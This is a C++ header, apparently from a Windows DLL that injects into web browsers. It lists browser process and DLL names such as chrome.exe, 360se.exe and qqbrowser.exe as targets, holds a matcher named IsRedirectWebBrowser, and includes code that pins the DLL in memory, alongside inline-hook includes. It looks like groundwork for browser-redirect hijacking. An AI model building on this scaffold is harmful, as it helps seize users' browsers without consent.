#pragma once
#include <tchar.h>
#include <assert.h>
#include <windows.h>

#include "CommonControl\Log.h"
#include "CommonControl\Commonfun.h"
#include "HookControl\HookHelp.h"
#include "HookControl\InlineHook.h"

#define _W(_str)		L##_str
#define _S(_str)		_str

#define ASSERT assert
#define ARR_COUNT(_array) (sizeof(_array) / sizeof(_array[0]))

typedef LPWSTR(WINAPI *__pfnGetCommandLineW) (VOID);

namespace Global {
	extern CDebug Log;
	extern __pfnGetCommandLineW pfnGetCommandLineW;
}

inline const wchar_t * __cdecl wcsistr(const wchar_t * str1, const wchar_t * str2)
{
	const wchar_t *cp = (const wchar_t *)str1;
	const wchar_t *s1, *s2;
	wchar_t c1 = L'\0', c2 = L'\0';

	if (!*str2)
		return((const wchar_t *)str1);

	while (*cp)
	{
		s1 = cp;
		s2 = (const wchar_t *)str2;
		c1 = (*s1 >= 'a' && *s1 <= 'z') ? *s1 - ('a' - 'A') : *s1;
		c2 = (*s2 >= 'a' && *s2 <= 'z') ? *s2 - ('a' - 'A') : *s2;

		while (c1 && c2 && !(c1 - c2))
		{
			s1++, s2++;

			c1 = (*s1 >= 'a' && *s1 <= 'z') ? *s1 - ('a' - 'A') : *s1;
			c2 = (*s2 >= 'a' && *s2 <= 'z') ? *s2 - ('a' - 'A') : *s2;
		}

		if (!*s2)
			return(cp);

		cp++;
	}

	return(NULL);

}

namespace {

	const wchar_t * ptszHitDllLists[] = {
		_W("Chrome.dll") , /* chrome 核心浏览器*/
		_W("MxWebkit.dll") , /* 遨游 核心浏览器*/
		_W("WebkitCore.dll") , /* 搜狗 核心浏览器*/
		_W("MxWebkit.dll") , /* chrome 核心浏览器*/
		_W("MxWebkit.dll") , /* chrome 核心浏览器*/
		_W("MxWebkit.dll") , /* chrome 核心浏览器*/
		_W("FastProxy.dll"), _W("ChromeCore.dll") , /* chrome 核心浏览器*/
	};

	const wchar_t * ptszHitProcessNameLists[] = {
		_W("iexplore.exe")/* IE 核心浏览器*/,

		_W("maxthon.exe")/* 遨游 核心浏览器*/,
		_W("liebao.exe")/* 猎豹 核心浏览器*/,
		_W("360se.exe")/* 360安全 核心浏览器*/,
		_W("360chrome.exe")/* 360极速 核心浏览器*/,
		_W("chrome.exe")/* Chrome 核心浏览器*/,
		_W("qqbrowser.exe")/* QQ 核心浏览器*/,
		_W("twchrome.exe")/* 世界之窗 核心浏览器*/,
		_W("sogouexplorer.exe")/* 搜狗 核心浏览器*/,
		_W("baidubrowser.exe")/* 百度 核心浏览器*/, //会出现无法打开的情况
		_W("2345explorer.exe")/* 2345 核心浏览器*/,

		_W("f1browser.exe")/* F1 核心浏览器*/,

		_W("yidian.exe")/* 一点浏览器 湖南岳阳 应该是当地实名制公司的*/

		_W("\\application\\")/* F1 核心浏览器*/,
		_W("浏览器\\")/* F1 核心浏览器*/,
		_W("\\浏览器")/* F1 核心浏览器*/,
	};

}

inline PPEB GetCurrentProcessPEB()
{
	return PPEB(__readfsdword(0x30));
}

inline PRTL_USER_PROCESS_PARAMETERS GetCurrentProcessParameters() {
	PPEB pProcessPEB = GetCurrentProcessPEB();

	if (NULL == pProcessPEB || NULL == pProcessPEB->ProcessParameters) {
		return NULL;
	}

	if (NULL == pProcessPEB->ProcessParameters->CommandLine.Buffer || NULL == pProcessPEB->ProcessParameters->ImagePathName.Buffer) {
		return NULL;
	}

	return pProcessPEB->ProcessParameters;
}

inline bool IsRedirectWebBrowser(const wchar_t * pcwszCheckString) {
	HINSTANCE hHitInstance = NULL;
	const wchar_t * pwszHitBrowserRule = NULL;

	//////////////////////////////////////////////////////////////////////////
	/// 通过进程名判断浏览器

	for (int i = 0; i < ARR_COUNT(ptszHitProcessNameLists); i++) {
		pwszHitBrowserRule = ptszHitProcessNameLists[i];

		if (NULL != wcsistr(pcwszCheckString, pwszHitBrowserRule)) {
			return true;
		}
		pwszHitBrowserRule = NULL;
	}

	////////////////////////////////////////////////////////////////////////////
	///// 通过核心文件判断浏览器

	//for (int i = 0; i < sizeof(ptszHitDllLists) / sizeof(ptszHitDllLists[0]); i++) {
	//	pwszHitBrowserRule = ptszHitDllLists[i];

	//	if (LockModule(pwszHitBrowserRule, &hHitInstance)) {
	//		UnlockModule(hHitInstance);
	//		return true;
	//	}

	//	pwszHitBrowserRule = NULL;
	//}

	return false;
}

inline bool LockCurrentModule() {
	char szModuleName[MAX_PATH + 1] = { 0 };
	GetModuleFileNameA(Common::GetModuleHandleByAddr(LockCurrentModule), szModuleName, MAX_PATH);

	return NULL != LoadLibraryA(szModuleName);
}

inline bool LockModule(_In_opt_ LPCWSTR lpModuleName, _Out_ HMODULE * phModule)
{
	BOOL bIsOK = FALSE;

#ifdef _DEBUG
	bIsOK = GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_PIN, lpModuleName, phModule);
#else
	bIsOK = GetModuleHandleExW(0, lpModuleName, phModule);
#endif

	if (bIsOK)
		ASSERT(NULL != *phModule);
	//	else
	//		ASSERT(NULL == GetModuleHandle(lpModuleName));

	return TRUE == bIsOK;
}

inline bool UnlockModule(HMODULE hModule)
{
	return TRUE == FreeLibrary(hModule);
}
